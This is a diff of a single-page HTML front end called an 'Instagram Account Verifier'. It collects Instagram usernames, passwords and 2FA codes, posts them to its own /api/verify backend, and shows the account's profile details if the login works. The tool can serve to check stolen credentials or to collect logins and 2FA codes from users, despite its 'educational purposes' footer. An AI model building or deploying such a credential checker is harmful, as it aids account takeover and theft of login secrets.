@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login Checker</title>
+    <title>Instagram Account Verifier</title>
     <style>
         * {
             margin: 0;
@@ -12,7 +12,7 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
@@ -23,399 +23,489 @@
 
         .container {
             background: white;
-            border-radius: 20px;
+            border-radius: 16px;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            max-width: 450px;
+            max-width: 440px;
             width: 100%;
             padding: 40px;
-            animation: slideUp 0.5s ease;
         }
 
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .logo {
+        .header {
             text-align: center;
             margin-bottom: 30px;
         }
 
-        .logo h1 {
-            font-size: 36px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
         }
 
-        .logo p {
-            color: #666;
+        h1 {
+            font-size: 24px;
+            color: #262626;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: #8e8e8e;
             font-size: 14px;
         }
 
-        .input-group {
-            margin-bottom: 20px;
+        .form-group {
+            margin-bottom: 16px;
         }
 
         label {
             display: block;
-            color: #333;
             font-size: 14px;
             font-weight: 600;
-            margin-bottom: 8px;
+            color: #262626;
+            margin-bottom: 6px;
         }
 
         input {
             width: 100%;
-            padding: 14px 16px;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
-            font-size: 15px;
-            transition: all 0.3s ease;
-            font-family: inherit;
+            padding: 12px 16px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.2s;
+            background: #fafafa;
         }
 
         input:focus {
             outline: none;
             border-color: #667eea;
-            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
+            background: white;
+        }
+
+        input::placeholder {
+            color: #8e8e8e;
         }
 
         .btn {
             width: 100%;
-            padding: 16px;
+            padding: 14px;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
-            border-radius: 10px;
-            font-size: 16px;
+            border-radius: 8px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-            position: relative;
-            overflow: hidden;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-top: 8px;
         }
 
-        .btn:hover {
+        .btn:hover:not(:disabled) {
             transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
         }
 
-        .btn:active {
+        .btn:active:not(:disabled) {
             transform: translateY(0);
         }
 
         .btn:disabled {
-            opacity: 0.7;
+            opacity: 0.6;
             cursor: not-allowed;
-            transform: none;
         }
 
-        .btn-text {
-            position: relative;
-            z-index: 1;
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
         }
 
-        .loader {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
             border-radius: 50%;
-            border-top-color: white;
-            animation: spin 0.8s linear infinite;
-            vertical-align: middle;
-            margin-right: 8px;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .result {
-            margin-top: 25px;
-            padding: 18px;
-            border-radius: 12px;
-            font-size: 14px;
-            line-height: 1.6;
             display: none;
-            animation: slideIn 0.4s ease;
+            margin-top: 20px;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 14px;
         }
 
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-15px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .success {
+        .result.success {
             background: #d4edda;
+            border: 1px solid #c3e6cb;
             color: #155724;
-            border: 2px solid #c3e6cb;
         }
 
-        .error {
+        .result.error {
             background: #f8d7da;
+            border: 1px solid #f5c6cb;
             color: #721c24;
-            border: 2px solid #f5c6cb;
         }
 
-        .warning {
+        .result.warning {
             background: #fff3cd;
+            border: 1px solid #ffeeba;
             color: #856404;
-            border: 2px solid #ffeaa7;
+        }
+
+        .result-title {
+            font-weight: 600;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .result-content {
+            margin-top: 12px;
         }
 
         .user-info {
-            margin-top: 15px;
-            padding: 18px;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-            border-radius: 12px;
-            font-size: 13px;
+            background: white;
+            padding: 12px;
+            border-radius: 6px;
+            margin-top: 12px;
         }
 
-        .user-info-row {
+        .info-row {
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+            padding: 8px 0;
+            border-bottom: 1px solid #f0f0f0;
         }
 
-        .user-info-row:last-child {
+        .info-row:last-child {
             border-bottom: none;
         }
 
-        .user-info-label {
-            font-weight: 600;
-            color: #333;
+        .info-label {
+            color: #8e8e8e;
+            font-size: 13px;
         }
 
-        .user-info-value {
-            color: #555;
-            text-align: right;
+        .info-value {
+            font-weight: 600;
+            color: #262626;
+            font-size: 13px;
         }
 
         .badge {
             display: inline-block;
-            padding: 4px 10px;
-            border-radius: 12px;
-            font-size: 12px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 11px;
             font-weight: 600;
         }
 
-        .badge-verified {
-            background: #4CAF50;
+        .badge.verified {
+            background: #0095f6;
             color: white;
         }
 
-        .badge-not-verified {
-            background: #f44336;
-            color: white;
+        .badge.private {
+            background: #ffc107;
+            color: #000;
         }
 
-        .hidden {
+        .two-fa-section {
             display: none;
+            margin-top: 16px;
+            padding: 16px;
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            border-radius: 8px;
         }
 
-        @media (max-width: 480px) {
-            .container {
-                padding: 30px 20px;
-            }
+        .two-fa-section.show {
+            display: block;
+        }
 
-            .logo h1 {
-                font-size: 28px;
-            }
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid #efefef;
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+
+        .api-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-bottom: 16px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ccc;
+        }
+
+        .status-dot.online {
+            background: #4caf50;
+            box-shadow: 0 0 8px rgba(76, 175, 80, 0.5);
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">
-            <h1>🔐 Instagram Checker</h1>
-            <p>Verify your Instagram login credentials</p>
+        <div class="header">
+            <div class="logo">📸</div>
+            <h1>Instagram Verifier</h1>
+            <p class="subtitle">Verify Instagram account credentials</p>
+            <div class="api-status">
+                <span class="status-dot" id="statusDot"></span>
+                <span id="statusText">Checking API...</span>
+            </div>
         </div>
 
-        <form id="loginForm">
-            <div class="input-group">
-                <label for="username">📱 Username</label>
+        <form id="verifyForm">
+            <div class="form-group">
+                <label for="username">Username</label>
                 <input 
                     type="text" 
                     id="username" 
-                    placeholder="your_instagram_username" 
+                    name="username" 
+                    placeholder="Enter Instagram username"
+                    required
                     autocomplete="username"
-                    required>
+                >
             </div>
 
-            <div class="input-group">
-                <label for="password">🔑 Password</label>
+            <div class="form-group">
+                <label for="password">Password</label>
                 <input 
                     type="password" 
                     id="password" 
-                    placeholder="••••••••" 
+                    name="password" 
+                    placeholder="Enter password"
+                    required
                     autocomplete="current-password"
-                    required>
+                >
             </div>
 
-            <div class="input-group hidden" id="tfaGroup">
-                <label for="tfa">🔐 2FA Verification Code</label>
-                <input 
-                    type="text" 
-                    id="tfa" 
-                    placeholder="123456" 
-                    maxlength="6"
-                    pattern="[0-9]{6}">
+            <div class="two-fa-section" id="twoFaSection">
+                <div class="form-group" style="margin-bottom: 0;">
+                    <label for="verificationCode">2FA Verification Code</label>
+                    <input 
+                        type="text" 
+                        id="verificationCode" 
+                        name="verificationCode" 
+                        placeholder="Enter 6-digit code"
+                        maxlength="6"
+                    >
+                </div>
             </div>
 
             <button type="submit" class="btn" id="submitBtn">
-                <span class="btn-text" id="btnText">Verify Login</span>
+                Verify Account
             </button>
         </form>
 
-        <div id="result" class="result"></div>
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p style="margin-top: 12px; color: #8e8e8e;">Verifying credentials...</p>
+        </div>
+
+        <div class="result" id="result"></div>
+
+        <div class="footer">
+            <p>⚠️ For educational purposes only</p>
+            <p style="margin-top: 4px;">Never share your credentials with untrusted services</p>
+        </div>
     </div>
 
     <script>
-        const form = document.getElementById('loginForm');
-        const resultDiv = document.getElementById('result');
-        const submitBtn = document.getElementById('submitBtn');
-        const btnText = document.getElementById('btnText');
-        const tfaGroup = document.getElementById('tfaGroup');
-        const usernameInput = document.getElementById('username');
-        const passwordInput = document.getElementById('password');
-        const tfaInput = document.getElementById('tfa');
+        const API_URL = '/api/verify';
+        let requires2FA = false;
 
-        // Determine API URL based on environment
-        const API_URL = window.location.hostname === 'localhost' 
-            ? 'http://localhost:5000/api/verify'
-            : '/api/verify';
+        // Check API status on load
+        async function checkAPIStatus() {
+            const statusDot = document.getElementById('statusDot');
+            const statusText = document.getElementById('statusText');
+            
+            try {
+                const response = await fetch('/api/verify', {
+                    method: 'GET'
+                });
+                
+                if (response.ok) {
+                    statusDot.classList.add('online');
+                    statusText.textContent = 'API Online';
+                } else {
+                    statusText.textContent = 'API Error';
+                }
+            } catch (error) {
+                statusText.textContent = 'API Offline';
+                console.error('API status check failed:', error);
+            }
+        }
 
-        form.addEventListener('submit', async (e) => {
+        // Show result message
+        function showResult(type, title, message, userInfo = null) {
+            const resultDiv = document.getElementById('result');
+            resultDiv.className = `result ${type}`;
+            
+            let html = `<div class="result-title">${getIcon(type)} ${title}</div>`;
+            html += `<div class="result-content">${message}</div>`;
+            
+            if (userInfo) {
+                html += `
+                    <div class="user-info">
+                        <div class="info-row">
+                            <span class="info-label">Username</span>
+                            <span class="info-value">@${userInfo.username}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Full Name</span>
+                            <span class="info-value">${userInfo.full_name || 'Not set'}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">User ID</span>
+                            <span class="info-value">${userInfo.user_id}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Followers</span>
+                            <span class="info-value">${userInfo.follower_count.toLocaleString()}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Following</span>
+                            <span class="info-value">${userInfo.following_count.toLocaleString()}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Status</span>
+                            <span class="info-value">
+                                ${userInfo.is_verified ? '<span class="badge verified">✓ Verified</span>' : ''}
+                                ${userInfo.is_private ? '<span class="badge private">🔒 Private</span>' : ''}
+                                ${!userInfo.is_verified && !userInfo.is_private ? 'Public Account' : ''}
+                            </span>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            resultDiv.innerHTML = html;
+            resultDiv.style.display = 'block';
+        }
+
+        function getIcon(type) {
+            const icons = {
+                'success': '✓',
+                'error': '✕',
+                'warning': '⚠'
+            };
+            return icons[type] || '•';
+        }
+
+        function setLoading(isLoading) {
+            const form = document.getElementById('verifyForm');
+            const loading = document.getElementById('loading');
+            const submitBtn = document.getElementById('submitBtn');
+            const resultDiv = document.getElementById('result');
+            
+            if (isLoading) {
+                form.style.display = 'none';
+                loading.style.display = 'block';
+                resultDiv.style.display = 'none';
+                submitBtn.disabled = true;
+            } else {
+                form.style.display = 'block';
+                loading.style.display = 'none';
+                submitBtn.disabled = false;
+            }
+        }
+
+        // Handle form submission
+        document.getElementById('verifyForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
-            const username = usernameInput.value.trim();
-            const password = passwordInput.value;
-            const tfa = tfaInput.value.trim();
-
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const verificationCode = document.getElementById('verificationCode').value.trim();
+            
             if (!username || !password) {
-                showResult('error', '❌ Please enter both username and password');
+                showResult('error', 'Validation Error', 'Please enter both username and password');
                 return;
             }
 
-            // Show loading state
-            submitBtn.disabled = true;
-            btnText.innerHTML = '<span class="loader"></span>Verifying...';
-            resultDiv.style.display = 'none';
+            setLoading(true);
 
             try {
+                const payload = {
+                    username: username,
+                    password: password
+                };
+
+                if (verificationCode) {
+                    payload.verification_code = verificationCode;
+                }
+
                 const response = await fetch(API_URL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({
-                        username: username,
-                        password: password,
-                        verification_code: tfa || null
-                    })
+                    body: JSON.stringify(payload)
                 });
+
+                const contentType = response.headers.get('content-type');
+                if (!contentType || !contentType.includes('application/json')) {
+                    throw new Error('Server returned non-JSON response. Please check API configuration.');
+                }
 
                 const data = await response.json();
 
                 if (data.success) {
-                    let userInfoHTML = '';
-                    if (data.user_info) {
-                        const info = data.user_info;
-                        userInfoHTML = `
-                            <div class="user-info">
-                                <div class="user-info-row">
-                                    <span class="user-info-label">Username</span>
-                                    <span class="user-info-value">@${info.username}</span>
-                                </div>
-                                <div class="user-info-row">
-                                    <span class="user-info-label">Full Name</span>
-                                    <span class="user-info-value">${info.full_name || 'N/A'}</span>
-                                </div>
-                                <div class="user-info-row">
-                                    <span class="user-info-label">User ID</span>
-                                    <span class="user-info-value">${info.user_id}</span>
-                                </div>
-                                <div class="user-info-row">
-                                    <span class="user-info-label">Verified</span>
-                                    <span class="user-info-value">
-                                        <span class="badge ${info.is_verified ? 'badge-verified' : 'badge-not-verified'}">
-                                            ${info.is_verified ? '✓ Verified' : '✗ Not Verified'}
-                                        </span>
-                                    </span>
-                                </div>
-                                <div class="user-info-row">
-                                    <span class="user-info-label">Account Type</span>
-                                    <span class="user-info-value">${info.is_private ? '🔒 Private' : '🔓 Public'}</span>
-                                </div>
-                                <div class="user-info-row">
-                                    <span class="user-info-label">Followers</span>
-                                    <span class="user-info-value">${formatNumber(info.follower_count)}</span>
-                                </div>
-                                <div class="user-info-row">
-                                    <span class="user-info-label">Following</span>
-                                    <span class="user-info-value">${formatNumber(info.following_count)}</span>
-                                </div>
-                                <div class="user-info-row">
-                                    <span class="user-info-label">Posts</span>
-                                    <span class="user-info-value">${formatNumber(info.media_count)}</span>
-                                </div>
-                            </div>
-                        `;
-                    }
-                    showResult('success', `${data.message}${userInfoHTML}`);
-                    tfaGroup.classList.add('hidden');
-                    form.reset();
-
+                    showResult('success', 'Login Successful', 'Account credentials are valid!', data.user_info);
+                    document.getElementById('twoFaSection').classList.remove('show');
+                    requires2FA = false;
                 } else if (data.requires_2fa) {
-                    tfaGroup.classList.remove('hidden');
-                    showResult('warning', data.message);
-                    tfaInput.focus();
-
+                    showResult('warning', '2FA Required', data.message);
+                    document.getElementById('twoFaSection').classList.add('show');
+                    requires2FA = true;
                 } else {
-                    showResult('error', data.message || data.error || 'Login failed');
+                    showResult('error', 'Verification Failed', data.message || data.error || 'Login failed');
+                    if (!requires2FA) {
+                        document.getElementById('twoFaSection').classList.remove('show');
+                    }
                 }
 
             } catch (error) {
                 console.error('Error:', error);
-                showResult('error', `❌ Network error: ${error.message}. Please check your connection.`);
+                showResult('error', 'Network Error', error.message || 'Failed to connect to API. Please check your connection.');
             } finally {
-                submitBtn.disabled = false;
-                btnText.textContent = 'Verify Login';
+                setLoading(false);
             }
         });
 
-        function showResult(type, message) {
-            resultDiv.className = `result ${type}`;
-            resultDiv.innerHTML = message;
-            resultDiv.style.display = 'block';
-        }
+        // Auto-format 2FA code input
+        document.getElementById('verificationCode').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+        });
 
-        function formatNumber(num) {
-            if (num >= 1000000) {
-                return (num / 1000000).toFixed(1) + 'M';
-            } else if (num >= 1000) {
-                return (num / 1000).toFixed(1) + 'K';
-            }
-            return num.toString();
-        }
+        // Check API status on page load
+        checkAPIStatus();
     </script>
 </body>
-  </html>
+    </html>
